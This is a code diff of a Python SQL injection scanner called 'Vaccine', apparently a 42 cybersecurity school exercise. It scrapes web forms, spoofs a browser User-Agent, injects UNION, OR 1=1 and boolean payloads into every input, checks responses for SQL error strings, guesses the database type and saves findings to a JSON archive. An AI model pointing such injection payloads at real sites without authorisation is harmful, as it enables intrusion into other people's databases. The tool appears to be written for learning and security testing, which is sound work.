@@ -4,14 +4,17 @@ import argparse
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
+import os
+import json
+import sys
 
-# keep session open 
-s = requests.Session ()
+# keep session open
+s = requests.Session()
 # you make the website believe that the request comes from a real user using a browser.
-s.headers ["User-Agent"] = "Mozilla/5.0 (Win64; x64) AppleWebKit/537.36 Chrome/87.0.4280.88"
+s.headers["User-Agent"] = "Mozilla/5.0 (Win64; x64) AppleWebKit/537.36 Chrome/87.0.4280.88"
 
 
-# return all form find
+# return all forms found
 def get_forms(url):
     q = BeautifulSoup(s.get(url).content, "html.parser")
     return q.find_all("form")
@@ -32,12 +35,11 @@ def get_forms(url):
 #     </form>
 # ]
 
-# returns a detailed dictionary form 
+# returns a detailed dictionary form
 def form_details(form):
     detailsOfForm = {}
-    # retrieve attribut action and method since form 
     action = form.attrs.get("action", "").lower()
-    method = form.attrs.get("method", "get").lower() # "get" is the default if method is not specified
+    method = form.attrs.get("method", "get").lower()
     inputs = []
     for input_tag in form.find_all("input"):
         input_type = input_tag.attrs.get("type", "text")
@@ -49,7 +51,6 @@ def form_details(form):
     detailsOfForm["action"] = action
     detailsOfForm["method"] = method
     detailsOfForm["inputs"] = inputs
-    # print(f"detailsForm: {detailsOfForm}")
     return detailsOfForm
 
 # detailsOfForm  = {
@@ -63,7 +64,6 @@ def form_details(form):
 # }
 
 def vulnerable(response):
-    # print("Response content:", response.content.decode().lower())
     errors = [
         "you have an error in your sql syntax",
         "warning: mysql",
@@ -78,50 +78,107 @@ def vulnerable(response):
     return False
 
 
-def SQLi(url, req_method):
-    print(f"iuhewouhfohfweohfweoihfwe : {req_method}")
-    f = get_forms(url)
-    print(f"[+] {len(f)} forms found on {url}.")
-    for form in f:
-        d = form_details(form)
-        print(d)
-        for c in "\"'":
-            data = {}
-            for i_tag in d["inputs"]:
-                if i_tag["type"] == "hidden" or i_tag["value"]:
-                    data[i_tag["name"]] = i_tag["value"] + c
-                elif i_tag["type"] != "submit":
-                    data[i_tag["name"]] = f"test{c}"
-            form_action_url = urljoin(url, d["action"])
-            if req_method == 'POST':
-                r = s.post(form_action_url, data=data)
-            # elif d["method"] == "get":
-            else:
-                r = s.get(form_action_url, params=data)
-            print("\n")
-            print(r)
-            if vulnerable(r):
-                print("SQLi attack detected:", form_action_url)
-                print("Payload used:", data)
-            else:
-                print("Not detected with payload:", data)
+def detect_db_type(response):
+    db_types = {
+        "mysql": "mysql",
+        "sqlite": "sqlite",
+        "oracle": "oracle",
+        "sql server": "sql server"
+    }
+    content = response.content.decode().lower()
+    for db, signature in db_types.items():
+        if signature in content:
+            return db
+    return "unknown"
+
+
+def sqli_tests(url, form_details, method):
+    # Payloads for different SQL injection methods
+    payloads = {
+        "Union": "' UNION SELECT NULL--",
+        "Error": "' OR 1=1--",
+        "Boolean": "' OR '1'='1'--"
+    }
+    detected_vulnerabilities = []
+
+    for test, payload in payloads.items():
+        data = {}
+        for input_tag in form_details["inputs"]:
+            print('\n')
+            print(f"INPUT TAG: {input_tag}")
+            print('\n')
+            if input_tag["type"] == "hidden" or input_tag["value"]:
+                data[input_tag["name"]] = input_tag["value"] + payload
+            elif input_tag["type"] != "submit":
+                data[input_tag["name"]] = f"test{payload}"
+
+        form_action_url = urljoin(url, form_details["action"])
+        if method == 'POST':
+            print(f"LA DATATATATATATTA: {data}")
+            r = s.post(form_action_url, data=data)
+        else:
+            r = s.get(form_action_url, params=data)
+
+        if vulnerable(r):
+            db_type = detect_db_type(r)
+            detected_vulnerabilities.append({
+                "method": test,
+                "url": form_action_url,
+                "payload": data,
+                "db_type": db_type
+            })
+
+    return detected_vulnerabilities
+
+
+def save_to_archive(data, filename):
+    if not os.path.exists(filename):
+        with open(filename, 'w') as f:
+            json.dump([], f)
+
+    with open(filename, 'r') as f:
+        existing_data = json.load(f)
+
+    existing_data.extend(data)
+
+    with open(filename, 'w') as f:
+        json.dump(existing_data, f, indent=4)
+
+
+def SQLi(url, req_method, archive_file):
+    forms = get_forms(url)
+    print(f"[+] {len(forms)} forms found on {url}.")
+    all_vulnerabilities = []
+    for form in forms:
+        form_details_dict = form_details(form)
+        vulnerabilities = sqli_tests(url, form_details_dict, req_method)
+        all_vulnerabilities.extend(vulnerabilities)
+
+    if all_vulnerabilities:
+        save_to_archive(all_vulnerabilities, archive_file)
+        for vuln in all_vulnerabilities:
+            print(f"SQLi attack detected: {vuln['url']}")
+            print(f"Payload used: {vuln['payload']}")
+            print(f"Database type: {vuln['db_type']}")
+    else:
+        print("No SQLi vulnerabilities detected.")
+
 
 if __name__ == "__main__":
-
     parser = argparse.ArgumentParser(
-                    prog='Vaccine',
-                    description='vaccine which allows you to perform an SQL injection by providing a url as parameter.',
-                    epilog='42 Cybersecurity')
+        prog='Vaccine',
+        description='Vaccine which allows you to perform an SQL injection by providing a URL as parameter.',
+        epilog='42 Cybersecurity')
 
     parser.add_argument('URL', type=str, help='The URL of the website to perform SQL injection')
     parser.add_argument('-o', type=str, default="archive", help='Archive file, if not specified it will be stored in a default one.')
     parser.add_argument('-X', type=str, default="GET", help='Type of request, if not specified GET will be used.')
 
     args = parser.parse_args()
+    if args.X != 'POST' and args.X != 'GET':
+        print("Error: method not accepted")
+        sys.exit(1)
+        
     print(args)
 
-    SQLi(args.URL, args.X)
-    # params = ['id', 'name', 'search']
-    # for param in params:
-    #     test_injection(args.URL, param, args.X)
-
+    SQLi(args.URL, args.X, args.o)
